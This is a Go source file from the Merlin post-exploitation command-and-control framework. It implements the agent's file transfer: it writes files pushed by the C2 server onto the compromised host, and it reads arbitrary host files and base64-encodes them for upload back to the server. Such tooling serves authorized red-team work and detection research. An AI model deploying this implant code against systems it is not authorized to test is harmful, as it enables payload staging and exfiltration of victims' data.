// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2021  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package commands

import (
	// Standard
	"crypto/sha1" // #nosec G505 Only used to get hash of a file
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"

	// Internal
	"github.com/Ne0nd0g/merlin/pkg/agent/cli"
	"github.com/Ne0nd0g/merlin/pkg/jobs"
)

// Download receives a job from the server to download a file to host where the Agent is running
func Download(transfer jobs.FileTransfer) jobs.Results {
	cli.Message(cli.DEBUG, "Entering into commands.Download() function")
	var result jobs.Results

	// Agent will be downloading a file from the server
	cli.Message(cli.NOTE, "FileTransfer type: Download")

	_, directoryPathErr := os.Stat(filepath.Dir(transfer.FileLocation))
	if directoryPathErr != nil {
		result.Stderr = fmt.Sprintf("There was an error getting the FileInfo structure for the remote "+
			"directory %s:\r\n", transfer.FileLocation)
		result.Stderr += directoryPathErr.Error()
	}
	if result.Stderr == "" {
		cli.Message(cli.NOTE, fmt.Sprintf("Writing file to %s", transfer.FileLocation))
		downloadFile, downloadFileErr := base64.StdEncoding.DecodeString(transfer.FileBlob)
		if downloadFileErr != nil {
			result.Stderr = downloadFileErr.Error()
		} else {
			errF := ioutil.WriteFile(transfer.FileLocation, downloadFile, 0600)
			if errF != nil {
				result.Stderr = errF.Error()
			} else {
				result.Stdout = fmt.Sprintf("Successfully uploaded file to %s", transfer.FileLocation)
			}
		}
	}
	return result
}

// Upload receives a job from the server to upload a file from the host to the Merlin server
func Upload(transfer jobs.FileTransfer) (jobs.FileTransfer, error) {
	cli.Message(cli.DEBUG, "Entering into commands.Upload() function")
	// Agent will uploading a file to the server
	cli.Message(cli.NOTE, "FileTransfer type: Upload")

	fileData, fileDataErr := ioutil.ReadFile(transfer.FileLocation)
	if fileDataErr != nil {
		cli.Message(cli.WARN, fmt.Sprintf("There was an error reading %s", transfer.FileLocation))
		cli.Message(cli.WARN, fileDataErr.Error())
		return jobs.FileTransfer{}, fmt.Errorf("there was an error reading %s:\r\n%s", transfer.FileLocation, fileDataErr.Error())
	}

	fileHash := sha1.New() // #nosec G401 // Use SHA1 because it is what many Blue Team tools use
	_, errW := io.WriteString(fileHash, string(fileData))
	if errW != nil {
		cli.Message(cli.WARN, fmt.Sprintf("There was an error generating the SHA1 file hash e:\r\n%s", errW.Error()))
	}

	cli.Message(cli.NOTE, fmt.Sprintf("Uploading file %s of size %d bytes and a SHA1 hash of %x to the server",
		transfer.FileLocation,
		len(fileData),
		fileHash.Sum(nil)))

	ft := jobs.FileTransfer{
		FileLocation: transfer.FileLocation,
		FileBlob:     base64.StdEncoding.EncodeToString([]byte(fileData)),
		IsDownload:   true,
	}
	return ft, nil
}
